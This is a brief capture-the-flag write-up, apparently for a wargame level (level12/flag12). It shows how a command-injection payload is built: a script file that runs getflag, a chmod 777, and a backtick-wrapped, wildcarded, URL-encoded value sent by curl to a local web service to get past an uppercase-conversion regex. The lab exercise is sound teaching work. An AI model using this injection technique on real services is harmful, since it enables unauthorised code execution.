## Project README: Finding flag12

Our routine: 
```bash
ls -la
find / -user flag12 -print 2>/dev/null
```

Firstly we cried a lot when we saw that it was a **regex**
Secondly when we cat the file we saw that **egrep** was inside **\`\`**
So the idea is to make this file run getflag cause in doing so we are not running getflag as user **level12** but as **flag12** since level12 file was created by **flag12**.

To do so, we create a file with getflag and a redirection like so:
```bash
echo 'getflag > /var/crash/flag' > /var/crash/123
```
We gave it all permission with :
```bash
chmod 777 /var/crash/123
```
Then we tryed to send our params with curl as :
```bash
curl http://127.0.0.1:4646/?x=\`/*/*/123\`&y=y
```
Due to the regex we had to put * instead of the repo bc the regex
put everything on maj.

But it did not work, so we tryed it with encode url:
```bash
curl http://127.0.0.1:4646/?x=%60%2F%2A%2F%2A%2F123%60&y=y
```

And VOILA
